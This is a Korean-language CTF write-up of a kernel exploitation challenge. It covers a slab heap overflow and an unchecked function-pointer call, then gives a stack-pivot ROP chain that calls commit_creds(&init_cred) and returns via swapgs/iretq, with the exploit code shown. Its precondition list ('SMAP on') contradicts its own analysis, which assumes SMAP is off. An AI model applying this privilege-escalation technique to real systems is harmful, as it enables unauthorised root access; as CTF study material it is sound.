---
title: "[Writeups][Club League 2025: Final] assignment3"
excerpt: "Club League 2025 Final - assignment3 (kernel)"

categories:
  - Writeups
tags:
  - [hspace, club league, assignment3]

permalink: /writeups/club-league-2025-final-assignment3/

toc: true
toc_sticky: true

date: 2025-11-25
last_modified_at: 2025-11-25
---

Club League 2025 Final에 나가서 푼 문제다. 처음 RIP Control은 다른 분이 찾으셨고, 나는 중간부터 들어가서 익스했다.
이건 마지막에 `swapgs`를 뺴먹어서 시간 안에 풀지는 못했다.

# 0. Precondition
- SMAP on
- SMEP off
- KASLR off
- KPTI off

# 1. 코드 분석

굉장히 쉽게 취약점을 줬다. 대놓고 힙 오버플로우를 준 것을 알 수 있었다.

```c
    case CMD_BOF:
        ret = copy_from_user(&req, (struct bof_req *)arg, sizeof(req));
        if (ret != 0) {
            ret = -EFAULT;
            break;
        }

        buf = kmem_cache_alloc(vuln_cache, GFP_KERNEL);

        ret = copy_from_user(buf, req.user_buf, req.user_buf_len);
        if (ret != 0)
            ret = -EFAULT;

        kmem_cache_free(vuln_cache, buf);
        break;
```

그리고 영향을 받는 구조체에서 다음과 같이 아무런 검증 없이 함수 포인터를 실행시켜, RIP control이 가능한 모습도 볼 수 있었다.

```c
    case CMD_CALL:
        idx = arg;
        if (!objs[idx]) {
            ret = -EINVAL;
            break;
        }

        objs[idx]->func();
        break;
```

이때 SMAP가 꺼져 있어 kernel context에서도 유저 영역의 메모리를 참조할 수 있다는 사실을 생각하면, 다음과 같은 공격 방식을 생각해볼 수 있다.

1. 커널에서 `mov esp, XXXX ; ret`처럼 `esp`를 유저 영역에서 할당할 수 있는 낮은 주소로 옮기는 가젯을 찾음
2. 유저 영역에서, 해당 주소를 `mmap()`해 할당받은 후 ROP chain을 준비해둠
3. 앞서 찾은 RIP Control Primitive를 통해 찾은 가젯을 실행시킴

# 2. exploit
## 2-1. 가젯 찾기

`ROPgadget`을 통해 쉽게 찾을 수 있다. 굉장히 많은 주소가 나오는데, 이 중 아무거나 골라서 사용하면 된다. 여기서는 다음과 같은 가젯을 사용했다.
```nasm
0xffffffff810e9e60 : mov esp, 0xf65f7201 ; ret
```

## 2-2. ROP Chain 준비

KASLR이 꺼져 있는 상태이기 때문에, 그냥 `/proc/kallsyms`를 조회해 필요한 함수들의 위치를 전부 얻을 수 있다. LPE가 목표이기 때문에 
`commit_creds(&init_cred)`를 실행시키는 것을 목표로 ROP Chain을 만들었다. 

여기서 주의할 점은, kernel context에서 user context로 복귀할 때 `iretq`만 사용한다고 끝나는 것이 아니라 `swapgs`도 같이 사용해줘야 한다는 것이다. 
이걸 까먹고 있어서 대회장에서 마무리를 못 했다. 여기에서는 `swapgs ; ret`같이 단순한 가젯이 없어 다음과 같은 흐름을 사용했다.

![swapgs_iretq](/assets/images/posts_img/writeups/club-league-final-assignment3/swapgs_iretq.png)

`rax`값에 주의해서 실행해주면 된다. 참고로 `pop rax ; ret` 가젯은 차고 넘쳤다. 

```c
#define mov_esp_0xf65f7201_ret 0xffffffff810e9e60
#define swapgs_pop_rdi_mov_rsp_rax_pop_rax_nop_iretq 0xffffffff8200176e
#define pop_rax_ret 0xffffffff81082d5d
...
    // prepare ROP chain
    char *ropchain = mmap((void *)0xf65f7000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, 01, 0);

    unsigned long *chain = (unsigned long *)0xf65f7201;
    *chain++ = pop_rdi_ret;
    *chain++ = init_cred;
    *chain++ = commit_creds;
    *chain++ = pop_rax_ret;
    *chain++ = 0x00000000f65f7239;
    *chain++ = swapgs_pop_rdi_mov_rsp_rax_pop_rax_nop_iretq;
    *chain++ = 0;
    *chain++ = 0;
    *chain++ = (unsigned long)&win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;
```

